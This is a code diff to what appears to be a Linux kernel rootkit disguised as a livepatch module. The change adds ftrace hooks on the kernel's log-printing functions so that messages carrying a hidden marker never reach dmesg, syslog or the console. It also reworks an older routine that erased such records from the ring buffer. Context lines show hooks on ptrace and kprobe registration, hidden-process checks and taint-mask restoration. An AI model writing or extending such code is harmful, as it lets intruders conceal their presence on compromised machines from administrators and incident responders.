@@ -803,6 +803,7 @@ static void hidden_from_enabled_functions_klp(struct klp_object *obj )
         }
 }
 
+#if 0
 static struct printk_log *log_from_idx(u32 idx)
 {
         struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);
@@ -832,12 +833,14 @@ static u32 log_next(u32 idx)
         }
         return idx + msg->len;
 }
+#endif
 
 static char *log_text(const struct printk_log *msg) 
 {
         return (char *)msg + sizeof(struct printk_log);
 }
 
+#if 0
 #define printk_safe_enter_irq()         \
         do {                                    \
                 local_irq_disable();            \
@@ -862,17 +865,45 @@ static char *log_text(const struct printk_log *msg)
                 printk_safe_exit_irq();                 \
         } while (0)
 
+#define printk_safe_enter_irqsave(flags)        \
+        do {                                    \
+                local_irq_save(flags);          \
+                p__printk_safe_enter();          \
+        } while (0)
 
+#define printk_safe_exit_irqrestore(flags)      \
+        do {                                    \
+                p__printk_safe_exit();           \
+                local_irq_restore(flags);       \
+        } while (0)
+
+#define logbuf_lock_irqsave(flags)                      \
+        do {                                            \
+                printk_safe_enter_irqsave(flags);       \
+                raw_spin_lock(p_logbuf_lock);            \
+        } while (0)
+
+#define logbuf_unlock_irqrestore(flags)         \
+        do {                                            \
+                raw_spin_unlock(p_logbuf_lock);          \
+                printk_safe_exit_irqrestore(flags);     \
+        } while (0)
+
+
+static void (*p_console_lock)(void) = NULL;
+static void (*p_console_unlock)(void) = NULL;
+static void (*p_wake_up_klogd)(void) = NULL;
 static void clear_klog(void)
 {
 	u64 seq;
 	u32 idx;
-#if 0
+	unsigned long flags;
+//#if 0
 	u64 sum_seq = 0;
 	u32 sum_idx = 0;
-	int flag = 0;
-#endif
-	logbuf_lock_irq();      
+	int first = 0;
+//#endif
+	logbuf_lock_irqsave(flags);	
 	seq = *p_clear_seq;
 	idx = *p_clear_idx;
 	while (seq < *p_log_next_seq) {
@@ -882,33 +913,50 @@ static void clear_klog(void)
 		idx = log_next(idx);
 		seq++;
 
-		//if (flag == 0) {
+		if (first == 0) {
 			if (msg->text_len >= sizeof(hidden_msg_klog)) {
 				if (strstr(text, hidden_msg_klog)) { 
-					//flag = 1;
-					//sum_seq++;
-					//sum_idx += msg->len;
+					first = 1;
+					sum_seq++;
+					sum_idx += msg->len;
 					msg->text_len = 0;
 					msg->dict_len = 0;
 					msg->len = 0;
 				}
 			}
-#if 0
+//#if 0
 		} else {
 			sum_seq++;
 			sum_idx += msg->len;
 		}
-#endif
+//#endif
 	}
 
-#if 0
-	if (*p_log_next_seq > sum_seq)
+//#if 0
+	if (*p_log_next_seq > sum_seq) {
 		*p_log_next_seq -= sum_seq;
-	if (*p_log_next_idx > sum_idx)
-		*p_log_next_idx -= sum_idx;
-#endif
-	logbuf_unlock_irq();      
+		if (*p_log_next_idx > sum_idx)
+			*p_log_next_idx -= sum_idx;
+
+		preempt_disable();
+		/*
+		 * Try to acquire and then immediately release the console
+		 * semaphore.  The release will print out buffers and wake up
+		 * /dev/kmsg and syslog() users.
+		 */
+		//if (p_console_trylock_spinning())
+		p_console_lock();
+		p_console_unlock();
+		preempt_enable();
+		p_wake_up_klogd();
+	}
+//	if (*p_log_next_idx > sum_idx)
+//		*p_log_next_idx -= sum_idx;
+	
+//#endif
+	logbuf_unlock_irqrestore(flags);
 }
+#endif
 
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*real_sched_getaffinity)(struct pt_regs *regs) = NULL;
@@ -1056,6 +1104,18 @@ static asmlinkage  int (*real_unregister_kprobe)(struct pt_regs *regs) = NULL;
 static asmlinkage  int ftrace_unregister_kprobe(struct pt_regs *regs)
 {
 	return real_unregister_kprobe(regs);
+}
+
+static asmlinkage  size_t (*real_msg_print_text)(struct pt_regs *regs) = NULL;
+static asmlinkage  size_t ftrace_msg_print_text(struct pt_regs *regs)
+{
+	return real_msg_print_text(regs);
+}
+
+static asmlinkage  ssize_t (*real_msg_print_ext_body)(struct pt_regs *regs) = NULL;
+static asmlinkage  ssize_t ftrace_msg_print_ext_body(struct pt_regs *regs)
+{
+	return real_msg_print_ext_body(regs);
 }
 #else
 
@@ -1452,6 +1512,39 @@ static asmlinkage  int ftrace_unregister_kprobe(struct kprobe *p)
 
 	return real_unregister_kprobe(p);
 }
+
+static asmlinkage  size_t (*real_msg_print_text)(const struct printk_log *msg, bool syslog,
+			                              bool time, char *buf, size_t size) = NULL;
+static asmlinkage  size_t ftrace_msg_print_text(const struct printk_log *msg, bool syslog,
+			                              bool time, char *buf, size_t size)
+{
+	char *text = NULL;
+
+	if (!msg)
+		return 0;
+
+	text = log_text(msg);
+	if (text && msg->text_len >= sizeof(hidden_msg_klog) && strstr(text, hidden_msg_klog))  
+		return 0;
+	
+	return real_msg_print_text(msg, syslog, time, buf, size);
+}
+
+static asmlinkage  ssize_t (*real_msg_print_ext_body)(char *buf, size_t size,
+		                                   char *dict, size_t dict_len,
+               			                    char *text, size_t text_len) = NULL;
+static asmlinkage  ssize_t ftrace_msg_print_ext_body(char *buf, size_t size,
+		                                   char *dict, size_t dict_len,
+               			                    char *text, size_t text_len)
+{
+	if (text && text_len >= sizeof(hidden_msg_klog) && strstr(text, hidden_msg_klog)) {  
+		//memset(buf-size+1, 0 , CONSOLE_EXT_LOG_MAX-1);
+		//return 0 - (CONSOLE_EXT_LOG_MAX - size);
+		return (1 - (CONSOLE_EXT_LOG_MAX - size));
+	}
+
+	return real_msg_print_ext_body(buf, size, dict, dict_len, text, text_len);
+}
 #endif
 
 /* Check syscalls for hidden proc
@@ -1583,6 +1676,8 @@ static struct ftrace_hook hooks[] = {
         HOOK("ptrace_attach", ftrace_ptrace_attach, &real_ptrace_attach),
         HOOK("register_kprobe", ftrace_register_kprobe, &real_register_kprobe),
         HOOK("unregister_kprobe", ftrace_unregister_kprobe, &real_unregister_kprobe),
+        HOOK("msg_print_text", ftrace_msg_print_text, &real_msg_print_text),
+        HOOK("msg_print_ext_body", ftrace_msg_print_ext_body, &real_msg_print_ext_body),
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -1835,6 +1930,24 @@ static int livepatch_init(void)
 	if (!p__printk_safe_exit)
 		return -1;
 
+	#if 0
+	p_console_trylock_spinning = (int (*)(void)) kallsyms_lookup_name("console_trylock_spinning");
+	if (!p_console_trylock_spinning)
+		return -1;
+
+	p_console_lock= (void (*)(void)) kallsyms_lookup_name("console_lock");
+	if (!p_console_lock)
+		return -1;
+
+	p_console_unlock= (void (*)(void)) kallsyms_lookup_name("console_unlock");
+	if (!p_console_unlock)
+		return -1;
+
+	p_wake_up_klogd = (void (*)(void)) kallsyms_lookup_name("wake_up_klogd");
+	if (!p_wake_up_klogd)
+		return -1;
+	#endif
+
 	p_name_to_int = (unsigned (*)(const struct qstr *qstr))
 				 kallsyms_lookup_name("name_to_int");
 	if (!p_name_to_int)
@@ -1911,7 +2024,7 @@ static int livepatch_init(void)
 	restore_tainted_mask();
 
 	*p_modules_disabled = force_modules_disabled;
-	clear_klog();
+	//clear_klog();
 
 	return ret;
 }
